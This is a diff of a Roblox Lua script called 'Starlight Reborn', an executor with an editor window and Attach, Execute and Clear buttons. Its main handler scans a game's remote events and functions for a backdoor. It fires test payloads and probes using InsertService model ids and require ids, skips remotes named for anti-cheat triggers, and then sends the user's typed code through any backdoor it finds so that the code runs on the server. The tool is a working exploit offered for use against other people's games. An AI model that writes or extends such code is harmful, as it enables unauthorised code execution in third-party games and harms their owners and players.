@@ -1,6 +1,56 @@
 -- 💫 Starlight Reborn
 -- by: C:\Drive
--- version: 0.1.0
+-- version: 0.1.5
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -149,8 +199,8 @@
 
 local STAR = {};
 
---# StarterGui.Starlight Reborn
-STAR["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+-- StarterGui.Starlight Reborn
+STAR["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
 STAR["1"]["IgnoreGuiInset"] = true;
 STAR["1"]["DisplayOrder"] = 1999999999;
 STAR["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
@@ -159,7 +209,7 @@ STAR["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 STAR["1"]["ResetOnSpawn"] = false;
 
 
---# StarterGui.Starlight Reborn.MainFrame
+-- StarterGui.Starlight Reborn.MainFrame
 STAR["2"] = Instance.new("Frame", STAR["1"]);
 STAR["2"]["BorderSizePixel"] = 0;
 STAR["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
@@ -170,12 +220,12 @@ STAR["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 STAR["2"]["Name"] = [[MainFrame]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.UICorner
+-- StarterGui.Starlight Reborn.MainFrame.UICorner
 STAR["3"] = Instance.new("UICorner", STAR["2"]);
 STAR["3"]["CornerRadius"] = UDim.new(0, 12);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Exit
+-- StarterGui.Starlight Reborn.MainFrame.Exit
 STAR["4"] = Instance.new("Frame", STAR["2"]);
 STAR["4"]["BorderSizePixel"] = 0;
 STAR["4"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
@@ -185,22 +235,22 @@ STAR["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 STAR["4"]["Name"] = [[Exit]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Exit.UICorner
+-- StarterGui.Starlight Reborn.MainFrame.Exit.UICorner
 STAR["5"] = Instance.new("UICorner", STAR["4"]);
 STAR["5"]["CornerRadius"] = UDim.new(0, 12);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Exit.UIStroke
+-- StarterGui.Starlight Reborn.MainFrame.Exit.UIStroke
 STAR["6"] = Instance.new("UIStroke", STAR["4"]);
 STAR["6"]["Transparency"] = 0.51;
 STAR["6"]["Color"] = Color3.fromRGB(145, 145, 145);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Exit.X
+-- StarterGui.Starlight Reborn.MainFrame.Exit.X
 STAR["7"] = Instance.new("ImageLabel", STAR["4"]);
 STAR["7"]["BorderSizePixel"] = 0;
 STAR["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
---# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
 STAR["7"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
 STAR["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
 STAR["7"]["Image"] = [[rbxassetid://12953907125]];
@@ -211,7 +261,7 @@ STAR["7"]["Name"] = [[X]];
 STAR["7"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Exit.Button
+-- StarterGui.Starlight Reborn.MainFrame.Exit.Button
 STAR["8"] = Instance.new("TextButton", STAR["4"]);
 STAR["8"]["BorderSizePixel"] = 0;
 STAR["8"]["TextSize"] = 14;
@@ -225,23 +275,23 @@ STAR["8"]["Text"] = [[]];
 STAR["8"]["Name"] = [[Button]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.UIGradient
+-- StarterGui.Starlight Reborn.MainFrame.UIGradient
 STAR["9"] = Instance.new("UIGradient", STAR["2"]);
 STAR["9"]["Rotation"] = 90;
 STAR["9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(39, 39, 39)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(25, 25, 25))};
 
 
---# StarterGui.Starlight Reborn.MainFrame.UIStroke
+-- StarterGui.Starlight Reborn.MainFrame.UIStroke
 STAR["a"] = Instance.new("UIStroke", STAR["2"]);
 STAR["a"]["Transparency"] = 0.51;
 STAR["a"]["Color"] = Color3.fromRGB(145, 145, 145);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Title
+-- StarterGui.Starlight Reborn.MainFrame.Title
 STAR["b"] = Instance.new("ImageLabel", STAR["2"]);
 STAR["b"]["BorderSizePixel"] = 0;
 STAR["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
---# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
 STAR["b"]["Image"] = [[rbxassetid://138561242127995]];
 STAR["b"]["Size"] = UDim2.new(0, 175, 0, 60);
 STAR["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
@@ -250,7 +300,7 @@ STAR["b"]["Name"] = [[Title]];
 STAR["b"]["Position"] = UDim2.new(0, 5, 0, 5);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon
+-- StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon
 STAR["c"] = Instance.new("Frame", STAR["b"]);
 STAR["c"]["BorderSizePixel"] = 0;
 STAR["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
@@ -261,18 +311,18 @@ STAR["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 STAR["c"]["Name"] = [[StatusIcon]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon.UICorner
+-- StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon.UICorner
 STAR["d"] = Instance.new("UICorner", STAR["c"]);
 STAR["d"]["CornerRadius"] = UDim.new(1, 0);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon.UIGradient
+-- StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon.UIGradient
 STAR["e"] = Instance.new("UIGradient", STAR["c"]);
 STAR["e"]["Rotation"] = 90;
 STAR["e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 77, 77)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(182, 55, 55))};
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox
 STAR["f"] = Instance.new("Frame", STAR["2"]);
 STAR["f"]["BorderSizePixel"] = 0;
 STAR["f"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
@@ -282,7 +332,7 @@ STAR["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
 STAR["f"]["Name"] = [[FastColoredTextbox]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll
 STAR["10"] = Instance.new("ScrollingFrame", STAR["f"]);
 STAR["10"]["Active"] = true;
 STAR["10"]["ZIndex"] = 2;
@@ -299,7 +349,7 @@ STAR["10"]["ScrollBarThickness"] = 16;
 STAR["10"]["BackgroundTransparency"] = 1;
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.TextBox
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.TextBox
 STAR["11"] = Instance.new("TextBox", STAR["10"]);
 STAR["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 STAR["11"]["BorderSizePixel"] = 0;
@@ -320,7 +370,7 @@ STAR["11"]["Text"] = [[]];
 STAR["11"]["BackgroundTransparency"] = 1;
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.Highlighting
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.Highlighting
 STAR["12"] = Instance.new("TextLabel", STAR["10"]);
 STAR["12"]["TextWrapped"] = true;
 STAR["12"]["BorderSizePixel"] = 0;
@@ -339,7 +389,7 @@ STAR["12"]["Name"] = [[Highlighting]];
 STAR["12"]["Position"] = UDim2.new(0, 20, 0, 0);
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LineSelector
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LineSelector
 STAR["13"] = Instance.new("Frame", STAR["10"]);
 STAR["13"]["ZIndex"] = -7;
 STAR["13"]["BorderSizePixel"] = 0;
@@ -351,7 +401,7 @@ STAR["13"]["Name"] = [[LineSelector]];
 STAR["13"]["BackgroundTransparency"] = 1;
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.Cursor
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.Cursor
 STAR["14"] = Instance.new("Frame", STAR["10"]);
 STAR["14"]["BorderSizePixel"] = 0;
 STAR["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
@@ -360,7 +410,7 @@ STAR["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 STAR["14"]["Name"] = [[Cursor]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.TextMeasurer
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.TextMeasurer
 STAR["15"] = Instance.new("TextLabel", STAR["10"]);
 STAR["15"]["BorderSizePixel"] = 0;
 STAR["15"]["TextSize"] = 15;
@@ -379,13 +429,13 @@ STAR["15"]["Name"] = [[TextMeasurer]];
 STAR["15"]["Position"] = UDim2.new(0, 20, 0, 0);
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesValue
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesValue
 STAR["16"] = Instance.new("NumberValue", STAR["10"]);
 STAR["16"]["Name"] = [[LinesValue]];
 STAR["16"]["Value"] = 1;
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame
 STAR["17"] = Instance.new("Frame", STAR["10"]);
 STAR["17"]["BorderSizePixel"] = 0;
 STAR["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
@@ -395,7 +445,7 @@ STAR["17"]["Name"] = [[LinesFrame]];
 STAR["17"]["BackgroundTransparency"] = 0.85;
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
 STAR["18"] = Instance.new("TextLabel", STAR["17"]);
 STAR["18"]["TextWrapped"] = true;
 STAR["18"]["BorderSizePixel"] = 0;
@@ -411,28 +461,28 @@ STAR["18"]["Text"] = [[1]];
 STAR["18"]["Name"] = [[TextLabelTemplate]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
 STAR["19"] = Instance.new("UIListLayout", STAR["17"]);
 STAR["19"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Handler
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Handler
 STAR["1a"] = Instance.new("LocalScript", STAR["f"]);
 STAR["1a"]["Name"] = [[Handler]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.UICorner
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.UICorner
 STAR["1b"] = Instance.new("UICorner", STAR["f"]);
 STAR["1b"]["CornerRadius"] = UDim.new(0, 12);
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.UIStroke
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.UIStroke
 STAR["1c"] = Instance.new("UIStroke", STAR["f"]);
 STAR["1c"]["Transparency"] = 0.51;
 STAR["1c"]["Color"] = Color3.fromRGB(145, 145, 145);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Execute
+-- StarterGui.Starlight Reborn.MainFrame.Execute
 STAR["1d"] = Instance.new("Frame", STAR["2"]);
 STAR["1d"]["BorderSizePixel"] = 0;
 STAR["1d"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
@@ -442,17 +492,17 @@ STAR["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 STAR["1d"]["Name"] = [[Execute]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Execute.UIStroke
+-- StarterGui.Starlight Reborn.MainFrame.Execute.UIStroke
 STAR["1e"] = Instance.new("UIStroke", STAR["1d"]);
 STAR["1e"]["Transparency"] = 0.51;
 STAR["1e"]["Color"] = Color3.fromRGB(145, 145, 145);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Execute.X
+-- StarterGui.Starlight Reborn.MainFrame.Execute.X
 STAR["1f"] = Instance.new("ImageLabel", STAR["1d"]);
 STAR["1f"]["BorderSizePixel"] = 0;
 STAR["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
---# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
 STAR["1f"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
 STAR["1f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
 STAR["1f"]["Image"] = [[rbxassetid://7980684777]];
@@ -464,7 +514,7 @@ STAR["1f"]["Name"] = [[X]];
 STAR["1f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Execute.Button
+-- StarterGui.Starlight Reborn.MainFrame.Execute.Button
 STAR["20"] = Instance.new("TextButton", STAR["1d"]);
 STAR["20"]["BorderSizePixel"] = 0;
 STAR["20"]["TextSize"] = 14;
@@ -478,12 +528,12 @@ STAR["20"]["Text"] = [[]];
 STAR["20"]["Name"] = [[Button]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Execute.UICorner
+-- StarterGui.Starlight Reborn.MainFrame.Execute.UICorner
 STAR["21"] = Instance.new("UICorner", STAR["1d"]);
 STAR["21"]["CornerRadius"] = UDim.new(0, 12);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Clear
+-- StarterGui.Starlight Reborn.MainFrame.Clear
 STAR["22"] = Instance.new("Frame", STAR["2"]);
 STAR["22"]["BorderSizePixel"] = 0;
 STAR["22"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
@@ -493,17 +543,17 @@ STAR["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 STAR["22"]["Name"] = [[Clear]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Clear.UIStroke
+-- StarterGui.Starlight Reborn.MainFrame.Clear.UIStroke
 STAR["23"] = Instance.new("UIStroke", STAR["22"]);
 STAR["23"]["Transparency"] = 0.51;
 STAR["23"]["Color"] = Color3.fromRGB(145, 145, 145);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Clear.X
+-- StarterGui.Starlight Reborn.MainFrame.Clear.X
 STAR["24"] = Instance.new("ImageLabel", STAR["22"]);
 STAR["24"]["BorderSizePixel"] = 0;
 STAR["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
---# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
 STAR["24"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
 STAR["24"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
 STAR["24"]["Image"] = [[rbxassetid://16346922164]];
@@ -514,7 +564,7 @@ STAR["24"]["Name"] = [[X]];
 STAR["24"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Clear.Button
+-- StarterGui.Starlight Reborn.MainFrame.Clear.Button
 STAR["25"] = Instance.new("TextButton", STAR["22"]);
 STAR["25"]["BorderSizePixel"] = 0;
 STAR["25"]["TextSize"] = 14;
@@ -528,12 +578,12 @@ STAR["25"]["Text"] = [[]];
 STAR["25"]["Name"] = [[Button]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Clear.UICorner
+-- StarterGui.Starlight Reborn.MainFrame.Clear.UICorner
 STAR["26"] = Instance.new("UICorner", STAR["22"]);
 STAR["26"]["CornerRadius"] = UDim.new(0, 12);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Attach
+-- StarterGui.Starlight Reborn.MainFrame.Attach
 STAR["27"] = Instance.new("Frame", STAR["2"]);
 STAR["27"]["BorderSizePixel"] = 0;
 STAR["27"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
@@ -543,17 +593,17 @@ STAR["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 STAR["27"]["Name"] = [[Attach]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Attach.UIStroke
+-- StarterGui.Starlight Reborn.MainFrame.Attach.UIStroke
 STAR["28"] = Instance.new("UIStroke", STAR["27"]);
 STAR["28"]["Transparency"] = 0.51;
 STAR["28"]["Color"] = Color3.fromRGB(145, 145, 145);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Attach.X
+-- StarterGui.Starlight Reborn.MainFrame.Attach.X
 STAR["29"] = Instance.new("ImageLabel", STAR["27"]);
 STAR["29"]["BorderSizePixel"] = 0;
 STAR["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
---# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
 STAR["29"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
 STAR["29"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
 STAR["29"]["Image"] = [[rbxassetid://115736032752379]];
@@ -565,7 +615,7 @@ STAR["29"]["Name"] = [[X]];
 STAR["29"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
---# StarterGui.Starlight Reborn.MainFrame.Attach.Button
+-- StarterGui.Starlight Reborn.MainFrame.Attach.Button
 STAR["2a"] = Instance.new("TextButton", STAR["27"]);
 STAR["2a"]["BorderSizePixel"] = 0;
 STAR["2a"]["TextSize"] = 14;
@@ -579,22 +629,22 @@ STAR["2a"]["Text"] = [[]];
 STAR["2a"]["Name"] = [[Button]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Attach.UICorner
+-- StarterGui.Starlight Reborn.MainFrame.Attach.UICorner
 STAR["2b"] = Instance.new("UICorner", STAR["27"]);
 STAR["2b"]["CornerRadius"] = UDim.new(0, 12);
 
 
---# StarterGui.Starlight Reborn.MainFrame.UIDragDetector
+-- StarterGui.Starlight Reborn.MainFrame.UIDragDetector
 STAR["2c"] = Instance.new("UIDragDetector", STAR["2"]);
 
 
 
---# StarterGui.Starlight Reborn.MainFrame.Handler
+-- StarterGui.Starlight Reborn.MainFrame.Handler
 STAR["2d"] = Instance.new("LocalScript", STAR["2"]);
 STAR["2d"]["Name"] = [[Handler]];
 
 
---# StarterGui.Starlight Reborn.MainFrame.Version
+-- StarterGui.Starlight Reborn.MainFrame.Version
 STAR["2e"] = Instance.new("TextLabel", STAR["2"]);
 STAR["2e"]["BorderSizePixel"] = 0;
 STAR["2e"]["TextSize"] = 32;
@@ -611,10 +661,10 @@ STAR["2e"]["Name"] = [[Version]];
 STAR["2e"]["Position"] = UDim2.new(0.73636, 5, 0.86, 2);
 
 
---# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Handler
+-- StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Handler
 local function C_1a()
 local script = STAR["1a"];
-	--## FastColoredTextBox v2 by: C:\Drive
+	--# FastColoredTextBox v2 by: C:\Drive
 	
 	local fctbelements = {
 		scroll = script.Parent.Scroll,
@@ -628,7 +678,7 @@ local script = STAR["1a"];
 		linesvalue = script.Parent.Scroll.LinesValue,
 	}
 	
-	--## Automatic Scrolling (1/6)
+	--# Automatic Scrolling (1/6)
 	local scrollingframe = fctbelements.scroll
 	local textbox = fctbelements.textbox
 	local textservice = game:GetService("TextService")
@@ -641,7 +691,7 @@ local script = STAR["1a"];
 	textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize)
 	updatecanvassize()
 	
-	--## Line Checker (2/6)
+	--# Line Checker (2/6)
 	local textbox = fctbelements.textbox
 	local linesvalue = fctbelements.linesvalue
 	
@@ -659,7 +709,7 @@ local script = STAR["1a"];
 		end
 	end)
 	
-	--## Lines (3/6)
+	--# Lines (3/6)
 	local scrollingframe = fctbelements.scroll
 	local frame = fctbelements.lines
 	local template = fctbelements.linetemp
@@ -687,7 +737,7 @@ local script = STAR["1a"];
 		currentlinecount = newlinecount
 	end)
 	
-	--## Cursor (4/6)
+	--# Cursor (4/6)
 	local fasttextbox = fctbelements.scroll
 	local textbox = fasttextbox:WaitForChild("TextBox")
 	local cursorframe = fasttextbox:WaitForChild("Cursor")
@@ -725,7 +775,7 @@ local script = STAR["1a"];
 	spawn(blink)
 	updatecursor()
 	
-	--## Selector (5/6)
+	--# Selector (5/6)
 	local fasttextbox = fctbelements.scroll
 	local textbox = fasttextbox:WaitForChild("TextBox")
 	local selector = fasttextbox:WaitForChild("LineSelector")
@@ -753,7 +803,7 @@ local script = STAR["1a"];
 	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
 	updatelineselector()
 	
-	--## Syntax Highlighting (6/6)
+	--# Syntax Highlighting (6/6)
 	local scrollingframe = fctbelements.scroll
 	local textbox = scrollingframe:WaitForChild("TextBox")
 	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
@@ -810,7 +860,7 @@ local script = STAR["1a"];
 		local result = ""
 		local i = 1
 		while i <= #code do
-			if code:sub(i, i+1) == "--#" then
+			if code:sub(i, i+1) == "--" then
 				local comment = code:sub(i):match("^%-%-[^\n]*")
 				result ..= colored(comment, "comment")
 				i += #comment
@@ -856,9 +906,15 @@ local script = STAR["1a"];
 	sync()
 end;
 task.spawn(C_1a);
---# StarterGui.Starlight Reborn.MainFrame.Handler
+-- StarterGui.Starlight Reborn.MainFrame.Handler
 local function C_2d()
 local script = STAR["2d"];
+	-- 💫 Starlight Reborn
+	-- by: C:\Drive
+	-- version: 0.1.5
+	
+	if script.Parent.Parent.Enabled == false then return end
+	
 	local mainframe = script.Parent
 	local textbox = mainframe.FastColoredTextbox.Scroll.TextBox
 	local statusgrad = mainframe.Title.StatusIcon:FindFirstChild("UIGradient")
@@ -870,16 +926,17 @@ local script = STAR["2d"];
 		exit = mainframe.Exit:FindFirstChildWhichIsA("TextButton"),
 	}
 	
-	local blacklistedstrings = {"CheatDetected", "ExploitDetected", "MouseLock", "MouseLoc"}
+	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
 	local holygrail = nil
 	local safetime = 0.32
 	local backdoored = false
 	local scanned = false
+	local method: string = nil
 	
 	local function notify(desc, duration)
 		pcall(function()
 			game:GetService("StarterGui"):SetCore("SendNotification", {
-				Title = "💫  Starlight Reborn 0.1.0",
+				Title = "💫  Starlight Reborn 0.1.5",
 				Text = tostring(desc),
 				Duration = duration or 3
 			})
@@ -900,6 +957,19 @@ local script = STAR["2d"];
 				rem:InvokeServer(code)
 			end
 		end)
+	end
+	
+	local function checkremote(rem) --# This makes scanning 10% faster
+		--# Credits to LALOL hub for this
+		if rem:FindFirstChild("__FUNCTION") or rem.Name == "__FUNCTION" then
+			return true
+		end
+		if rem.Parent.Parent then
+			if rem.Parent.Parent.Name == "HDAdminClient" and rem.Parent.Name == "Signals" then
+				return true
+			end
+		end
+		return false
 	end
 	
 	for _, g in pairs(mainframe:GetChildren()) do
@@ -932,10 +1002,34 @@ local script = STAR["2d"];
 	
 		local testpartname = "starlightreborn_" .. tostring(math.random(1000, 9999))
 		local payload = [[
-	            local i = Instance.new("Folder", game:GetService("Lighting"))
-	            i.Name = "]]..testpartname..[["
-	        ]]
-	
+	        local i = Instance.new("Folder", game:GetService("Lighting"))
+	        i.Name = "]]..testpartname..[["
+	    ]]
+		
+		local modelid = 71218023216098
+		local requireid = 129156425867376
+		
+		local function testinsert(remote)
+			if not remote then return false end
+			fire(remote, modelid)
+			task.wait(safetime)
+			if workspace:FindFirstChild("Hopperbin_7540912",true) then
+				return true
+			end
+		end
+		
+		local function testrequire(remote)
+			if not remote then return false end
+			fire(remote, requireid)
+			task.wait(safetime)
+			if game:GetService("Lighting"):FindFirstChildWhichIsA("FluidForceSensor") then
+				local a = game:GetService("Lighting"):FindFirstChildWhichIsA("FluidForceSensor")
+				if a.Name == "3Zy6R9G_STARLIGHT_AwtpBy2rX" then
+					return true
+				end
+			end
+		end
+		
 		local function testremote(remote)
 			if not remote then return false end
 			fire(remote, payload)
@@ -947,6 +1041,7 @@ local script = STAR["2d"];
 			if not r.Parent then continue end
 			if r.Parent.Name == "RobloxReplicatedStorage" 
 				or r.Parent.Name == "DefaultChatSystemChatEvents" then continue end
+			if checkremote(r) then continue end
 	
 			if (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then
 				local isblacklisted = false
@@ -958,10 +1053,25 @@ local script = STAR["2d"];
 				end
 	
 				if not isblacklisted then
-					print("Starlight Reborn | Testing: "..r.Name)
+					print("Starlight Reborn | Testing with InsertService: "..r.Name)
+					if testinsert(r) then
+						holygrail = r
+						backdoored = true
+						method = "InsertService"
+						break
+					end
+					print("Starlight Reborn | Testing with requiring: "..r.Name)
+					if testrequire(r) then
+						holygrail = r
+						backdoored = true
+						method = "Requiring"
+						break
+					end
+					print("Starlight Reborn | Testing with payload: "..r.Name)
 					if testremote(r) then
 						holygrail = r
 						backdoored = true
+						method = "Execution"
 						break
 					end
 				end
@@ -972,8 +1082,8 @@ local script = STAR["2d"];
 		buttons.attach.Interactable = false
 	
 		if backdoored and holygrail then
-			notify("Found a backdoor: "..holygrail.Name, 5)
-			print("Starlight Reborn | Found a backdoor: "..holygrail.Name)
+			notify("Found a backdoor: "..holygrail.Name.." | Method: "..method, 5)
+			print("Starlight Reborn | Found a backdoor: "..holygrail.Name.." | Method: "..method)
 			statusgrad.Color = ColorSequence.new(Color3.fromRGB(90, 255, 95), Color3.fromRGB(42, 135, 35))
 		else
 			notify("No backdoors were found :(", 5)
@@ -985,7 +1095,10 @@ local script = STAR["2d"];
 		if not backdoored or not holygrail then
 			notify("No backdoor available! Run attach first.", 3)
 			return
+		elseif not backdoored and scanned then
+			notify("This game isn't backdoored, try another game.", 3)
 		end
+		
 		local code = textbox.Text
 		if code ~= "" then
 			fire(holygrail, code)
